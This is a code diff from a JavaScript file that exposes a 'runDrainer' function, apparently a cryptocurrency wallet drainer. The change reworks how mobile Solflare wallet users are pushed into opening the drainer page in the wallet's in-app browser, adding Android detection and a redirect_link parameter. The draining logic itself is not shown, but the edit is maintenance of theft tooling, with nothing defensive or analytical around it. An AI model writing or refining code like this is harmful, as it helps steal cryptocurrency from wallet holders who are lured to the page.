@@ -6112,12 +6112,23 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use exact Solflare URL format - restore ref parameter for functionality
+            // Mobile: Use exact Solflare URL format with redirect_link for Android
             const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
-            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
-            console.log(`[SOLFLARE_MOBILE] Deep link: ${deepLink}`);
-            console.log(`[SOLFLARE_MOBILE] Fallback: ${fallbackUrl}`);
+            const redirectLink = encodeURIComponent(`${window.location.origin}${window.location.pathname}`);
+            
+            // Detect platform for different handling
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isAndroid = /android/.test(userAgent);
+            
+            if (isAndroid) {
+              // Android: Use redirect_link parameter
+              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
+              fallbackUrl = `solflare://v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
+            } else {
+              // iOS: Use ref parameter (existing working format)
+              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+              fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            }
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
